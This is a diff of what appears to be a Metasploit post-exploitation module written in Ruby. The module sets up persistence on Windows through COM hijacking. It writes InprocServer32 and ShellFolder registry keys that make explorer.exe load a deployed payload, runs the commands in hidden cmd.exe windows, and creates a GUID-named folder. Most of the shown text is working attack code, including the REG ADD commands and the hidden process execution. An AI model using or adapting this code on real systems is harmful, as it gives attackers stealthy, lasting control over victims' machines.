@@ -213,9 +213,9 @@ def run
     #
     print_status("check if file exists in target ..")
     if session.fs.file.exist?(app_path)
-      print_good("file found ..")
+      print_good("Application (payload) found ..")
     else
-      print_error("not found: #{app_path}")
+      print_error("Application not found: #{app_path}")
       print_warning("Deploy your payload before using this module")
       print_line("")
       Rex::sleep(1.0)
@@ -240,18 +240,18 @@ def run
        print_status("Persiste in explorer.exe selected ..")
        Rex::sleep(1.0)
        hacks = [
-        'REG ADD "#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{app_path}" /f',
-        'REG ADD "#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d" /f',
-        'REG ADD "#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment" /f',
-        'REG ADD "#{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d 0xf090013d" /f',
-        'REG ADD "#{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d" /f',
+        '#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d \"#{app_path}\" /f',
+        '#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f',
+        '#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d \"Apartment\" /f',
+        '#{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d \"0xf090013d\" /f',
+        '#{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d /f',
         'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
        ]
      else
        print_status("Demo mode selected ..")
        Rex::sleep(1.0)
        hacks = [
-        'REG ADD "#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f',
+        '#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f',
         'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
        ]
      end
@@ -262,7 +262,7 @@ def run
        hacks.each do |cmd|
           begin
             # execute cmd prompt in a hidden channelized windows
-            r = session.sys.process.execute("cmd.exe /R #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+            r = session.sys.process.execute("cmd.exe /R REG ADD #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
             print_line("  Hijacking : #{cmd}")
  
                # close client channel when done
@@ -291,7 +291,7 @@ def run
            r=''
            print_status("Creating #{fol_path}")
            Rex::sleep(1.0)
-           r = session.sys.process.execute("cmd.exe /R mkdir #{fol_path}.#{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
+           r = session.sys.process.execute("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
            r.close
          end
@@ -304,8 +304,8 @@ def run
          r=''
          print_status("Delete registry entry: #{new_GUID}..")
          Rex::sleep(1.0)
-         reg_clear = "REG DELETE #{hive_key}\\#{new_GUID} /f"
-         r = session.sys.process.execute("cmd.exe /c #{reg_clear}", nil, {'Hidden' => true, 'Channelized' => true})
+         reg_clear = "#{hive_key}\\#{new_GUID} /f"
+         r = session.sys.process.execute("cmd.exe /R REG DELETE #{reg_clear}", nil, {'Hidden' => true, 'Channelized' => true})
          print_status("Deleted: #{reg_clear}")
          Rex::sleep(1.0)
            if datastore['PERSIST_EXPLORER'] == true
